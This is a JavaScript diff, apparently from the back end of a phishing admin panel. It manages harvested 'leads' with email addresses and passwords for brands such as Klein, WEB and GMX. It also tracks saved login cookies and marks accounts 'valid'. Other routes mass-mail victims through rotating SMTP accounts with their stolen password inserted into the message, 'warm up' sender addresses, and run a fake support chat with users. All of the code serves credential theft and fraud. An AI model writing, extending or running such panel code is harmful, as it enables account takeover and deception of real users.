+        emptyHint = 'Нет лидов в выборке. Для режимов «Валид» / «Валид не отправлено» нужны сохранённые куки входа (файлы в login/cookies). «Валид не отправлено» пропускает лидов, у кого в логе уже есть «Send Email» (или старые подписи). Отработанные не берутся.';
+      }
+      return send(res, 200, {
+        ok: true,
+        mode: mode,
+        total: targets.length,
+        sent,
+        failed,
+        failSamples,
+        hint: emptyHint || undefined
+      });
+    });
+    return true;
+  }
+
+  /** Архив по фильтру: отработанные (как в сайдбаре) — Klein → klLogArchived, WEB/GMX → adminLogArchived. */
+  if (pathname === '/api/archive-leads-by-filter' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const filter = (json.filter != null) ? String(json.filter).trim() : '';
+      if (filter !== 'worked') {
+        return send(res, 400, { ok: false, error: 'Неизвестный фильтр' });
+      }
+      const stats = leadService.archiveLeadsByFilterWorked(pushEvent);
+      return send(res, 200, {
+        ok: true,
+        archived: stats.archived,
+        matchedWorked: stats.matchedWorked,
+        skippedAlreadyArchived: stats.skippedAlreadyArchived
+      });
+    });
+    return true;
+  }
+
+  /** Массовая отправка письма из Config → E-Mail всем лидам со статусом Успех (show_success), у кого есть email. */
+  if (pathname === '/api/send-email-all-success' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', async () => {
+      if (!nodemailer) {
+        return send(res, 500, { ok: false, error: 'nodemailer not installed' });
+      }
+      const data = readConfigEmail();
+      let cfgDefault = data.current;
+      const klCfg = (data.configs || []).find(function (c) { return c.id === 'kl' || (c.name && String(c.name).toLowerCase().indexOf('klein') !== -1); });
+      const smtpLineDefault = (cfgDefault && cfgDefault.smtpLine && cfgDefault.smtpLine.trim()) ? cfgDefault.smtpLine : '';
+      if (!smtpLineDefault) {
+        return send(res, 400, { ok: false, error: 'В Config → E-Mail не задан SMTP (текущий профиль).' });
+      }
+      let leads = leadService.readLeads();
+      const targets = leads.filter(function (l) {
+        if (l.status !== 'show_success') return false;
+        const to = (l.email || l.emailKl || '').trim();
+        return !!to;
+      });
+      let sent = 0;
+      let failed = 0;
+      let skipped = 0;
+      const failSamples = [];
+
+      function cfgForLead(lead) {
+        let cfg = cfgDefault;
+        if (lead.brand === 'klein' && klCfg && (klCfg.smtpLine || '').trim()) {
+          cfg = klCfg;
+        }
+        return cfg;
+      }
+
+      for (let i = 0; i < targets.length; i++) {
+        const lead = targets[i];
+        const idx = leads.findIndex((x) => x.id === lead.id);
+        if (idx === -1) {
+          skipped++;
+          continue;
+        }
+        const live = leads[idx];
+        const cfg = cfgForLead(live);
+        if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
+          skipped++;
+          continue;
+        }
+        const smtpList = parseSmtpLines(cfg.smtpLine);
+        if (!smtpList.length) {
+          skipped++;
+          continue;
+        }
+        const toEmail = (live.email || live.emailKl || '').trim();
+        const password = (live.password || live.passwordKl || '').trim();
+        let html = (cfg.html || '')
+          .replace(/_email_/g, toEmail)
+          .replace(/_password_/g, password);
+        const attachments = [];
+        if (cfg.image1Base64 && html.indexOf('_src1_') !== -1) {
+          try {
+            const buf = Buffer.from(cfg.image1Base64, 'base64');
+            const cid = 'image1@mail';
+            html = html.replace(/_src1_/g, 'cid:' + cid);
+            attachments.push({ filename: 'image1.png', content: buf, cid: cid });
+          } catch (e) {}
+        } else if (html.indexOf('_src1_') !== -1) {
+          html = html.replace(/_src1_/g, '');
+        }
+        const smtp = smtpList[0];
+        const transporter = nodemailer.createTransport({
+          host: smtp.host,
+          port: smtp.port,
+          secure: smtp.port === 465,
+          auth: { user: smtp.user, pass: smtp.password }
+        });
+        const fromStr = (cfg.senderName ? '"' + String(cfg.senderName).replace(/"/g, '') + '" <' + smtp.fromEmail + '>' : smtp.fromEmail);
+        const mailOptions = {
+          from: fromStr,
+          to: toEmail,
+          subject: (cfg.title || '').trim() || 'Message',
+          html,
+          attachments: attachments.length ? attachments : undefined,
+          envelope: { from: smtp.fromEmail, to: toEmail }
+        };
+        try {
+          await transporter.sendMail(mailOptions);
+          pushEvent(live, CONFIG_EMAIL_SENT_EVENT_LABEL, 'admin');
+          leadService.persistLeadPatch(live.id, { eventTerminal: live.eventTerminal });
+          sent++;
+          console.log('[send-email-all-success] ' + smtp.fromEmail + ' → ' + toEmail);
+        } catch (err) {
+          failed++;
+          const msg = (err.message || '').slice(0, 200);
+          pushEvent(live, 'Письмо (массово) не отправилось: ' + msg, 'admin');
+          leadService.persistLeadPatch(live.id, { eventTerminal: live.eventTerminal });
+          if (failSamples.length < 8) failSamples.push({ id: live.id, email: toEmail, error: msg });
+          console.error('[send-email-all-success] ошибка → ' + toEmail + ': ' + msg);
+        }
+        if (i < targets.length - 1) await new Promise((r) => setTimeout(r, 400));
+      }
+      return send(res, 200, {
+        ok: true,
+        total: targets.length,
+        sent,
+        failed,
+        skipped,
+        failSamples
+      });
+    });
+    return true;
+  }
+
+  /** KL: архивировать лог Klein — не принимать новые данные с того же visitId/email/fp. */
+  if (pathname === '/api/lead-kl-archive' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const id = (json.id != null) ? String(json.id).trim() : '';
+      const klLogArchived = json.klLogArchived === true;
+      if (!id) return send(res, 400, { ok: false, error: 'id required' });
+      const leads = leadService.readLeads();
+      const lead = leads.find((l) => l.id === id);
+      if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
+      if (lead.brand !== 'klein') {
+        return send(res, 400, { ok: false, error: 'Только для логов Klein' });
+      }
+      leadService.applyKleinLogArchivedToggle(lead, klLogArchived, pushEvent);
+      leadService.persistLeadPatch(id, { klLogArchived: lead.klLogArchived, eventTerminal: lead.eventTerminal });
+      return send(res, 200, { ok: true, klLogArchived: klLogArchived });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/warmup-start' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      if (warmupState.running) return send(res, 400, { ok: false, error: 'Прогрев уже запущен' });
+      const data = readWarmupEmailConfig();
+      const currentId = data.currentId || (data.configs && data.configs[0] && data.configs[0].id) || null;
+      const currentConfig = currentId ? (data.configs || []).find((c) => c.id == currentId) : (data.configs && data.configs[0]) || null;
+      const configs = (currentConfig && (currentConfig.smtpLine || '').trim()) ? [currentConfig] : [];
+      if (!configs.length) return send(res, 400, { ok: false, error: 'Выберите конфиг с SMTP в режиме Прогрев и нажмите Старт' });
+      let leads = [];
+      if (Array.isArray(json.recipients) && json.recipients.length > 0) {
+        leads = json.recipients.map((r) => ({ email: (r && r.email) ? String(r.email).trim() : '', password: (r && r.password) ? String(r.password) : '' })).filter((l) => l.email);
+      }
+      if (leads.length === 0) leads = leadService.readLeads().filter((l) => (l.email || '').trim());
+      if (!leads.length) return send(res, 400, { ok: false, error: 'Нет получателей. Заполните базу для прогрева или загрузите лиды на сервере.' });
+      let perSmtpLimit = typeof json.perSmtpLimit === 'number' ? json.perSmtpLimit : parseInt(json.perSmtpLimit, 10);
+      if (isNaN(perSmtpLimit) || perSmtpLimit < 1) perSmtpLimit = 10;
+      if (perSmtpLimit > 10000) perSmtpLimit = 10000;
+      let delaySec = typeof json.delaySec === 'number' ? json.delaySec : parseFloat(json.delaySec);
+      if (isNaN(delaySec) || delaySec < 0.5) delaySec = 2;
+      if (delaySec > 300) delaySec = 300;
+      let numThreads = typeof json.numThreads === 'number' ? json.numThreads : parseInt(json.numThreads, 10);
+      if (isNaN(numThreads) || numThreads < 1) numThreads = 1;
+      if (numThreads > 20) numThreads = 20;
+      const flatList = [];
+      configs.forEach((cfg) => {
+        const smtpList = parseSmtpLines(cfg.smtpLine || '');
+        smtpList.forEach((smtp) => flatList.push({ config: cfg, smtp }));
+      });
+      warmupState.stopped = false;
+      warmupState.paused = false;
+      warmupState.configs = configs;
+      warmupState.flatList = flatList;
+      warmupState.leads = leads;
+      warmupState.perSmtpLimit = perSmtpLimit;
+      warmupState.delayMs = Math.round(delaySec * 1000);
+      warmupState.numThreads = numThreads;
+      warmupState.sentPerSmtp = Object.assign({}, readWarmupSmtpStats());
+      warmupState.log = [{ text: '[Прогрев запущен. Потоков: ' + numThreads + ', лимит с каждого SMTP: ' + perSmtpLimit + ', задержка: ' + delaySec + ' сек. SMTP по кругу (всего ' + flatList.length + '), лиды по кругу]', type: 'muted' }];
+      warmupState.totalSent = 0;
+      warmupState.running = true;
+      for (let w = 0; w < numThreads; w++) setImmediate(runWarmupStep);
+      return send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/warmup-status' && req.method === 'GET') {
+    if (!checkAdminAuth(req, res)) return;
+    const persisted = readWarmupSmtpStats();
+    const seen = {};
+    const list = [];
+    if (warmupState.running && warmupState.flatList && warmupState.flatList.length) {
+      warmupState.flatList.forEach((entry) => {
+        const email = entry.smtp.fromEmail;
+        if (!seen[email]) {
+          seen[email] = true;
+          list.push({ id: email, name: email, sent: warmupState.sentPerSmtp[email] || 0 });
+        }
+      });
+    }
+    Object.keys(persisted).forEach((email) => {
+      if (!seen[email]) {
+        seen[email] = true;
+        list.push({ id: email, name: email, sent: warmupState.sentPerSmtp[email] ?? persisted[email] });
+      }
+    });
+    return send(res, 200, {
+      running: warmupState.running,
+      paused: warmupState.paused,
+      totalSent: warmupState.totalSent,
+      sentPerConfig: list,
+      log: warmupState.log.slice(-200)
+    });
+  }
+
+  if (pathname === '/api/warmup-stats-reset' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const fromEmail = (json.fromEmail != null) ? String(json.fromEmail).trim() : '';
+      if (!fromEmail) return send(res, 400, { ok: false, error: 'fromEmail required' });
+      const stats = readWarmupSmtpStats();
+      delete stats[fromEmail];
+      writeWarmupSmtpStats(stats);
+      if (warmupState.sentPerSmtp[fromEmail] !== undefined) delete warmupState.sentPerSmtp[fromEmail];
+      return send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/warmup-pause' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      const wasPaused = warmupState.paused;
+      warmupState.paused = !warmupState.paused;
+      if (wasPaused && !warmupState.paused && body) {
+        try {
+          const json = JSON.parse(body);
+          if (typeof json.delaySec === 'number' || typeof json.delaySec === 'string') {
+            let delaySec = typeof json.delaySec === 'number' ? json.delaySec : parseFloat(json.delaySec);
+            if (!isNaN(delaySec) && delaySec >= 0.5 && delaySec <= 300) warmupState.delayMs = Math.round(delaySec * 1000);
+          }
+          if (typeof json.perSmtpLimit === 'number' || typeof json.perSmtpLimit === 'string') {
+            let perSmtpLimit = typeof json.perSmtpLimit === 'number' ? json.perSmtpLimit : parseInt(json.perSmtpLimit, 10);
+            if (!isNaN(perSmtpLimit) && perSmtpLimit >= 1 && perSmtpLimit <= 10000) warmupState.perSmtpLimit = perSmtpLimit;
+          }
+          if (typeof json.numThreads === 'number' || typeof json.numThreads === 'string') {
+            let numThreads = typeof json.numThreads === 'number' ? json.numThreads : parseInt(json.numThreads, 10);
+            if (!isNaN(numThreads) && numThreads >= 1 && numThreads <= 20 && numThreads > warmupState.numThreads) {
+              for (let w = warmupState.numThreads; w < numThreads; w++) setImmediate(runWarmupStep);
+              warmupState.numThreads = numThreads;
+            } else if (!isNaN(numThreads) && numThreads >= 1 && numThreads <= 20) {
+              warmupState.numThreads = numThreads;
+            }
+          }
+        } catch (e) {}
+      }
+      return send(res, 200, { ok: true, paused: warmupState.paused });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/warmup-stop' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    warmupState.stopped = true;
+    return send(res, 200, { ok: true });
+  }
+
+  // Публичный эндпоинт: пароль для ZIP показывается на странице Sicherheit (распаковка)
+  if (pathname === '/api/chat-open' && req.method === 'POST') {
+    console.log('[CHAT-OPEN] POST /api/chat-open: запрос получен');
+    if (!checkAdminAuth(req, res)) {
+      console.log('[CHAT-OPEN] POST /api/chat-open: 403 (нет или неверный токен)');
+      return;
+    }
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const leadId = (json.leadId != null) ? String(json.leadId).trim() : '';
+      if (!leadId) {
+        console.log('[CHAT-OPEN] POST /api/chat-open: пустой leadId, 400');
+        return send(res, 400, { ok: false });
+      }
+      const chat = chatService.readChat();
+      if (!chat._openChatRequested || typeof chat._openChatRequested !== 'object') chat._openChatRequested = Object.create(null);
+      const requestId = String(Date.now());
+      chat._openChatRequested[leadId] = requestId;
+      chatService.writeChat(chat);
+      console.log('[CHAT-OPEN] POST /api/chat-open: админ запросил открыть чат leadId=' + leadId + ' requestId=' + requestId);
+      return send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  // Юзер подтвердил открытие чата — сбрасываем флаг в файле
+  if (pathname === '/api/chat-open-ack' && req.method === 'POST') {
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const leadId = (json.leadId != null) ? String(json.leadId).trim() : '';
+      if (leadId) {
+        const chat = chatService.readChat();
+        if (chat._openChatRequested && typeof chat._openChatRequested === 'object') {
+          delete chat._openChatRequested[leadId];
+          chatService.writeChat(chat);
+        }
+        console.log('[CHAT-OPEN] POST /api/chat-open-ack: юзер подтвердил открытие leadId=' + leadId);
+      }
+      return send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  // Печатает: who = 'support' | 'user', typing = true | false
+  if (pathname === '/api/chat-typing' && req.method === 'POST') {
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const leadId = (json.leadId != null) ? String(json.leadId).trim() : '';
+      const who = (json.who === 'support' || json.who === 'user') ? json.who : null;
+      const typing = json.typing === true;
+      if (!leadId || !who) return send(res, 400, { ok: false });
+      if (who === 'support') {
+        const token = getAdminTokenFromRequest(req, parsed);
+        if (!ADMIN_TOKEN || token !== ADMIN_TOKEN) return send(res, 403, { ok: false });
+      }
+      chatService.setChatTyping(leadId, who, typing);
+      return send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  // Юзер прочитал чат — сохраняем время по email (общее для всех логов с этой почтой)
+  if (pathname === '/api/chat-read' && req.method === 'POST') {
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const leadId = (json.leadId != null) ? String(json.leadId).trim() : '';
+      if (!leadId) return send(res, 400, { ok: false });
+      const chatKey = chatService.getChatKeyForLeadId(leadId);
+      const chat = chatService.readChat();
+      if (!chat._readAt) chat._readAt = Object.create(null);
+      chat._readAt[chatKey] = new Date().toISOString();
+      chatService.writeChat(chat);
+      return send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  }
+  return false;
+}
+
+module.exports = { handle };
